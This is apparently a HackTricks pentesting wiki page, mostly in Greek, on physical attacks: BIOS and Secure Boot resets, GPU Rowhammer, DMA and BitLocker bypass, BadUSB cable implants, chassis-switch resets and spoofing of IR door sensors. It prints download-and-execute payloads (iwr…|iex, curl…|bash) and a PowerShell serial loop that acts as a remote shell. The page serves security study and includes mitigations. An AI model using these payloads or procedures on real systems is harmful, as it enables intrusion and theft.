# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## Ανάκτηση κωδικού BIOS και ασφάλεια συστήματος

Η **επαναφορά του BIOS** μπορεί να πραγματοποιηθεί με διάφορους τρόπους. Οι περισσότερες μητρικές περιλαμβάνουν μια **μπαταρία** η οποία, αν αφαιρεθεί για περίπου **30 λεπτά**, θα επαναφέρει τις ρυθμίσεις του BIOS, συμπεριλαμβανομένου του κωδικού πρόσβασης. Εναλλακτικά, μπορεί να ρυθμιστεί ένας **jumper στη μητρική**, ώστε να γίνει επαναφορά αυτών των ρυθμίσεων συνδέοντας συγκεκριμένες ακίδες.

Σε περιπτώσεις όπου οι τροποποιήσεις hardware δεν είναι δυνατές ή πρακτικές, τα **εργαλεία λογισμικού** προσφέρουν μια λύση. Η εκτέλεση ενός συστήματος από ένα **Live CD/USB** με distributions όπως το **Kali Linux** παρέχει πρόσβαση σε εργαλεία όπως τα **_killCmos_** και **_CmosPWD_**, τα οποία μπορούν να βοηθήσουν στην ανάκτηση του κωδικού BIOS.

Σε περιπτώσεις όπου ο κωδικός BIOS είναι άγνωστος, η εσφαλμένη εισαγωγή του **τρεις φορές** συνήθως οδηγεί στην εμφάνιση ενός κωδικού σφάλματος. Αυτός ο κωδικός μπορεί να χρησιμοποιηθεί σε websites όπως το [https://bios-pw.org](https://bios-pw.org), ώστε να ανακτηθεί ενδεχομένως ένας έγκυρος κωδικός πρόσβασης.

### Ασφάλεια UEFI

Για σύγχρονα συστήματα που χρησιμοποιούν **UEFI** αντί για το παραδοσιακό BIOS, μπορεί να χρησιμοποιηθεί το εργαλείο **chipsec** για την ανάλυση και τροποποίηση των ρυθμίσεων UEFI, συμπεριλαμβανομένης της απενεργοποίησης του **Secure Boot**. Αυτό μπορεί να επιτευχθεί με την ακόλουθη εντολή:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Ανάλυση RAM και Cold Boot Attacks

Η RAM διατηρεί δεδομένα για λίγο μετά τη διακοπή της τροφοδοσίας, συνήθως για **1 έως 2 λεπτά**. Αυτή η persistence μπορεί να επεκταθεί έως τα **10 λεπτά** με την εφαρμογή ψυχρών ουσιών, όπως υγρό άζωτο. Κατά τη διάρκεια αυτής της παρατεταμένης περιόδου, μπορεί να δημιουργηθεί ένα **memory dump** με εργαλεία όπως τα **dd.exe** και **volatility** για analysis.

---

## GPU Rowhammer Against Page Tables

Οι σύγχρονες GPU Rowhammer attacks γίνονται πολύ πιο χρήσιμες όταν στοχεύουν **GPU virtual-memory metadata** αντί για συνηθισμένα buffers. Πρόσφατη έρευνα σε **GDDR6 NVIDIA Ampere GPUs** δείχνει ότι ένας attacker που εκτελεί unprivileged CUDA code μπορεί να δημιουργήσει GPU-specific hammering patterns, να χρησιμοποιήσει **memory massaging** για να τοποθετήσει paging structures σε ευάλωτες γραμμές και, στη συνέχεια, να πραγματοποιήσει bit flips στο **last-level page table** ή σε ένα ενδιάμεσο **page directory**. Μόλις καταστραφεί μία translation entry, ο attacker μπορεί να κάνει bootstrap για **arbitrary GPU memory read/write** και, στη συνέχεια, να κάνει pivot σε host compromise.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Profile hammerable rows** στη GDDR6 και δημιουργία refresh-aware / non-uniform hammering patterns που παρακάμπτουν τα in-DRAM mitigations.
2. **Massage GPU allocations**, ώστε ο driver να τοποθετεί τις page-translation structures σε hammerable physical locations αντί να τις διατηρεί στο default protected pool. Στην πράξη, αυτό μπορεί να σημαίνει εξάντληση της low-memory page-table region και spraying μεγάλων sparse UVM mappings με controlled strides.
3. **Flip translation metadata**, όπως τα **PFN** ή aperture-related bits, μέσα σε ένα page-table / page-directory entry, ώστε η virtual page που ελέγχει ο attacker να επιλύεται σε page-table pages, arbitrary GPU memory ή host-visible system mappings.
4. Επαναχρησιμοποίηση του forged mapping για την επανεγγραφή πρόσθετων translation entries και κλιμάκωση σε **arbitrary GPU memory read/write** μεταξύ GPU contexts.

### Host Pivot and Mitigations

- Με **IOMMU disabled**, τα forged system-aperture mappings μπορούν να εκθέσουν arbitrary **host physical memory** στη GPU, μετατρέποντας το GPU primitive σε πλήρες host compromise.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Το **GDDRHammer** στοχεύει last-level page-table entries, ενώ το **GeForge** δείχνει ότι η καταστροφή ενός page-directory level μπορεί να είναι ευκολότερη, επειδή ένα bit flip μπορεί να ανακατευθύνει ένα μεγαλύτερο translation subtree. Μην αντιμετωπίζετε μόνο ένα paging layer ως security-critical.<sup>[[1]](#references)[[2]](#references)</sup>
- Το **IOMMU** εξακολουθεί να έχει σημασία, επειδή αποκλείει το direct arbitrary-host-memory path που χρησιμοποιούν τα GDDRHammer/GeForge, αλλά **δεν αποτελεί πλήρες mitigation**. Το **GPUBreach** παρουσιάζει ένα second-stage pivot, όπου ο attacker καταστρέφει GPU-writable, driver-owned CPU buffers και, στη συνέχεια, ενεργοποιεί NVIDIA driver memory-safety bugs για να αποκτήσει kernel write primitive και ένα **root shell**, ακόμη και με ενεργοποιημένο το IOMMU.<sup>[[3]](#references)</sup>
- Το **system-level ECC** είναι ένα πρακτικό hardening step σε υποστηριζόμενες workstation/server GPUs. Οι consumer GPUs χωρίς ECC εκθέτουν μια πιο αδύναμη defense surface.<sup>[[4]](#references)</sup>
- Αυτές οι attacks δεν είναι καθαρά θεωρητικές: το **GeForge** ανέφερε **1.171** bit flips σε RTX 3060 και **202** σε RTX A6000, τα οποία ήταν αρκετά για τη δημιουργία μιας λειτουργικής host-privilege-escalation chain.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

Το **INCEPTION** είναι ένα tool σχεδιασμένο για **physical memory manipulation** μέσω DMA, συμβατό με interfaces όπως τα **FireWire** και **Thunderbolt**. Επιτρέπει την παράκαμψη των login procedures μέσω patching της memory, ώστε να γίνεται αποδεκτός οποιοσδήποτε κωδικός πρόσβασης. Ωστόσο, είναι ineffective απέναντι σε συστήματα **Windows 10**.

---

## Live CD/USB για System Access

Η αλλαγή system binaries, όπως τα **_sethc.exe_** ή **_Utilman.exe_**, με ένα αντίγραφο του **_cmd.exe_** μπορεί να παρέχει command prompt με system privileges. Tools όπως το **chntpw** μπορούν να χρησιμοποιηθούν για την επεξεργασία του **SAM** file μιας Windows installation, επιτρέποντας αλλαγές κωδικών πρόσβασης.

Το **Kon-Boot** είναι ένα tool που διευκολύνει το logging into Windows systems χωρίς γνώση του κωδικού πρόσβασης, τροποποιώντας προσωρινά τον Windows kernel ή το UEFI. Περισσότερες πληροφορίες υπάρχουν στη διεύθυνση [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Πρόσβαση στις ρυθμίσεις BIOS.
- **F8**: Είσοδος σε Recovery mode.
- Το πάτημα του **Shift** μετά το Windows banner μπορεί να παρακάμψει το autologon.

### BAD USB Devices

Devices όπως τα **Rubber Ducky** και **Teensyduino** λειτουργούν ως platforms για τη δημιουργία **bad USB** devices, ικανών να εκτελούν predefined payloads όταν συνδεθούν σε έναν target computer.

### Volume Shadow Copy

Τα administrator privileges επιτρέπουν τη δημιουργία copies ευαίσθητων files, συμπεριλαμβανομένου του **SAM** file, μέσω PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 based implants, όπως το **Evil Crow Cable Wind**, κρύβονται μέσα σε καλώδια USB-A→USB-C ή USB-C↔USB-C, κάνουν enumerate αποκλειστικά ως USB keyboard και εκθέτουν το C2 stack τους μέσω Wi-Fi. Ο operator χρειάζεται μόνο να τροφοδοτήσει το καλώδιο από το victim host, να δημιουργήσει ένα hotspot με όνομα `Evil Crow Cable Wind` και password `123456789` και να ανοίξει τη διεύθυνση [http://cable-wind.local/](http://cable-wind.local/) (ή τη DHCP address) για να αποκτήσει πρόσβαση στο embedded HTTP interface.<sup>[[8]](#references)</sup>
- Το browser UI παρέχει tabs για *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* και *Config*. Τα stored payloads φέρουν tags ανά OS, τα keyboard layouts αλλάζουν on the fly και τα VID/PID strings μπορούν να τροποποιηθούν ώστε να μιμούνται γνωστά peripherals.
- Επειδή το C2 βρίσκεται μέσα στο καλώδιο, ένα τηλέφωνο μπορεί να κάνει stage payloads, να ενεργοποιεί την execution και να διαχειρίζεται τα Wi-Fi credentials χωρίς να αγγίζει το host OS — ιδανικό για physical intrusions σύντομου dwell-time.

### OS-aware AutoExec payloads

- Οι AutoExec rules συνδέουν ένα ή περισσότερα payloads ώστε να εκτελούνται αμέσως μετά το USB enumeration. Το implant πραγματοποιεί lightweight OS fingerprinting και επιλέγει το matching script.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ή `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Επειδή η execution είναι unattended, η απλή αντικατάσταση ενός charging cable μπορεί να επιτύχει “plug-and-pwn” initial access στο context του logged-on user.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Ένα stored payload ανοίγει μια console και κάνει paste έναν loop που εκτελεί οτιδήποτε φτάνει στη νέα USB serial device. Μια minimal Windows variant είναι:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Το implant διατηρεί ανοιχτό το USB CDC channel ενώ το ESP32-S3 εκκινεί έναν TCP client (Python script, Android APK ή desktop executable) προς τον operator. Οποιαδήποτε bytes πληκτρολογούνται στη TCP session προωθούνται στον παραπάνω serial loop, παρέχοντας remote command execution ακόμη και σε air-gapped hosts. Η έξοδος είναι περιορισμένη, επομένως οι operators συνήθως εκτελούν blind commands (δημιουργία λογαριασμών, staging πρόσθετων εργαλείων κ.λπ.).

### Επιφάνεια HTTP OTA update

- Το ίδιο web stack συνήθως εκθέτει firmware updates χωρίς authentication. Το Evil Crow Cable Wind ακούει στο `/update` και κάνει flash οποιουδήποτε binary που γίνεται upload:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Οι field operators μπορούν να κάνουν hot-swap λειτουργιών (π.χ. να κάνουν flash το firmware του flash USB Army Knife) κατά τη διάρκεια του engagement, χωρίς να ανοίξουν το καλώδιο, επιτρέποντας στο implant να στραφεί σε νέες δυνατότητες ενώ παραμένει συνδεδεμένο στο host-στόχο.

## Παράκαμψη της κρυπτογράφησης BitLocker

Η κρυπτογράφηση BitLocker μπορεί δυνητικά να παρακαμφθεί, αν ο **κωδικός πρόσβασης ανάκτησης** βρεθεί μέσα σε ένα αρχείο memory dump (**MEMORY.DMP**). Για τον σκοπό αυτό μπορούν να χρησιμοποιηθούν εργαλεία όπως τα **Elcomsoft Forensic Disk Decryptor** ή **Passware Kit Forensic**.

---

## Social Engineering για προσθήκη recovery key

Ένα νέο BitLocker recovery key μπορεί να προστεθεί μέσω τακτικών social engineering, πείθοντας έναν χρήστη να εκτελέσει μια εντολή που προσθέτει ένα νέο recovery key αποτελούμενο από μηδενικά, απλοποιώντας έτσι τη διαδικασία αποκρυπτογράφησης.

---

## Εκμετάλλευση των Chassis Intrusion / Maintenance Switches για factory-reset του BIOS

Πολλοί σύγχρονοι φορητοί υπολογιστές και desktop υπολογιστές μικρού form factor περιλαμβάνουν έναν **chassis-intrusion switch**, τον οποίο παρακολουθούν ο Embedded Controller (EC) και το firmware BIOS/UEFI. Ενώ ο κύριος σκοπός του switch είναι να δημιουργεί alert όταν ανοίγει μια συσκευή, οι vendors μερικές φορές υλοποιούν μια **undocumented recovery shortcut**, η οποία ενεργοποιείται όταν το switch αλλάζει κατάσταση σύμφωνα με ένα συγκεκριμένο μοτίβο.<sup>[[5]](#references)[[6]](#references)</sup>

### Πώς λειτουργεί η επίθεση

1. Το switch είναι συνδεδεμένο σε ένα **GPIO interrupt** στον EC.
2. Το firmware που εκτελείται στον EC καταγράφει το **timing και τον αριθμό των πατημάτων**.
3. Όταν αναγνωριστεί ένα hard-coded μοτίβο, ο EC καλεί μια ρουτίνα *mainboard-reset* που **διαγράφει τα περιεχόμενα του system NVRAM/CMOS**.
4. Κατά την επόμενη εκκίνηση, το BIOS φορτώνει τις προεπιλεγμένες τιμές – **ο supervisor password, τα Secure Boot keys και όλες οι custom ρυθμίσεις διαγράφονται**.

> Μόλις απενεργοποιηθεί το Secure Boot και εξαφανιστεί το firmware password, ο attacker μπορεί απλώς να εκκινήσει οποιοδήποτε external OS image και να αποκτήσει unrestricted access στους εσωτερικούς δίσκους.

### Παράδειγμα από τον πραγματικό κόσμο – Framework 13 Laptop

Η recovery shortcut για το Framework 13 (11th/12th/13th-gen) είναι:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Μετά τον δέκατο κύκλο, το EC θέτει ένα flag που δίνει εντολή στο BIOS να διαγράψει το NVRAM στην επόμενη επανεκκίνηση. Ολόκληρη η διαδικασία διαρκεί ~40 s και απαιτεί **μόνο ένα κατσαβίδι**.<sup>[[5]](#references)</sup>

### Generic Exploitation Procedure

1. Ενεργοποιήστε ή θέστε σε αναστολή και επαναφέρετε το target, ώστε να εκτελείται το EC.
2. Αφαιρέστε το κάτω κάλυμμα για να αποκαλύψετε τον διακόπτη intrusion/maintenance.
3. Αναπαραγάγετε το μοτίβο εναλλαγής που είναι ειδικό για τον vendor (συμβουλευτείτε documentation, forums ή κάντε reverse-engineer το firmware του EC).
4. Επανασυναρμολογήστε και κάντε reboot – οι firmware protections θα πρέπει να είναι απενεργοποιημένες.
5. Κάντε boot από live USB (π.χ. Kali Linux) και εκτελέστε το συνηθισμένο post-exploitation (credential dumping, data exfiltration, εμφύτευση malicious EFI binaries κ.λπ.).

### Detection & Mitigation

* Καταγράφετε τα chassis-intrusion events στην OS management console και συσχετίζετέ τα με απρόσμενα BIOS resets.
* Χρησιμοποιείτε **tamper-evident seals** στις βίδες/καλύμματα για τον εντοπισμό ανοίγματος.
* Διατηρείτε τις συσκευές σε **physically controlled areas**· θεωρείτε ότι το physical access ισοδυναμεί με πλήρες compromise.
* Όπου είναι διαθέσιμο, απενεργοποιήστε τη λειτουργία “maintenance switch reset” του vendor ή απαιτήστε πρόσθετη cryptographic authorisation για NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Τα commodity “wave-to-exit” sensors συνδυάζουν έναν near-IR LED emitter με ένα receiver module τύπου τηλεχειριστηρίου TV, το οποίο αναφέρει logic high μόνο αφού ανιχνεύσει πολλαπλούς παλμούς (~4–10) του σωστού carrier (≈30 kHz).<sup>[[7]](#references)</sup>
- Ένα πλαστικό shroud εμποδίζει τον emitter και τον receiver να είναι στραμμένοι απευθείας ο ένας προς τον άλλον, οπότε ο controller θεωρεί ότι οποιοσδήποτε validated carrier προέρχεται από κοντινή ανάκλαση και ενεργοποιεί ένα relay που ανοίγει το door strike.
- Μόλις ο controller θεωρήσει ότι υπάρχει target, συχνά αλλάζει το outbound modulation envelope, όμως ο receiver συνεχίζει να αποδέχεται οποιοδήποτε burst ταιριάζει με τον filtered carrier.

### Attack Workflow
1. **Capture του emission profile** – συνδέστε έναν logic analyser στους ακροδέκτες του controller για να καταγράψετε τόσο τις pre-detection όσο και τις post-detection waveforms που οδηγούν το εσωτερικό IR LED.
2. **Replay μόνο της “post-detection” waveform** – αφαιρέστε ή αγνοήστε τον stock emitter και οδηγήστε ένα εξωτερικό IR LED με το ήδη ενεργοποιημένο pattern από την αρχή. Επειδή ο receiver ενδιαφέρεται μόνο για το pulse count/frequency, αντιμετωπίζει τον spoofed carrier ως γνήσια ανάκλαση και ενεργοποιεί τη relay line.
3. **Gate της μετάδοσης** – μεταδώστε τον carrier σε tuned bursts (π.χ. δεκάδες milliseconds on και παρόμοιο διάστημα off), ώστε να παρέχετε το ελάχιστο pulse count χωρίς να κορέσετε το AGC του receiver ή το interference handling logic. Η συνεχής εκπομπή αποευαισθητοποιεί γρήγορα τον sensor και σταματά την ενεργοποίηση του relay.

### Long-Range Reflective Injection
- Η αντικατάσταση του bench LED με ένα high-power IR diode, MOSFET driver και focusing optics επιτρέπει αξιόπιστο triggering από απόσταση ~6 m.
- Ο attacker δεν χρειάζεται line-of-sight προς το receiver aperture· η στόχευση της δέσμης σε εσωτερικούς τοίχους, ράφια ή door frames που είναι ορατά μέσα από γυαλί επιτρέπει στην ανακλώμενη ενέργεια να εισέλθει στο ~30° field of view και να μιμηθεί ένα hand wave από κοντινή απόσταση.
- Επειδή οι receivers αναμένουν μόνο ασθενείς ανακλάσεις, μια πολύ ισχυρότερη εξωτερική δέσμη μπορεί να ανακλαστεί σε πολλαπλές επιφάνειες και να παραμείνει πάνω από το detection threshold.

### Weaponised Attack Torch
- Η ενσωμάτωση του driver μέσα σε έναν commercial flashlight αποκρύπτει το εργαλείο σε κοινή θέα. Αντικαταστήστε το ορατό LED με ένα high-power IR LED που ταιριάζει στη ζώνη του receiver, προσθέστε ένα ATtiny412 (ή παρόμοιο) για τη δημιουργία των bursts ≈30 kHz και χρησιμοποιήστε ένα MOSFET για τη βύθιση του LED current.
- Ένας telescopic zoom lens περιορίζει τη δέσμη για range/precision, ενώ ένα vibration motor υπό MCU control παρέχει haptic confirmation ότι το modulation είναι ενεργό, χωρίς εκπομπή ορατού φωτός.
- Η εναλλαγή μεταξύ αρκετών αποθηκευμένων modulation patterns (με ελαφρώς διαφορετικές carrier frequencies και envelopes) αυξάνει τη συμβατότητα με rebranded sensor families, επιτρέποντας στον operator να σαρώσει ανακλαστικές επιφάνειες μέχρι να ακουστεί το relay να κάνει click και να απελευθερωθεί η πόρτα.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
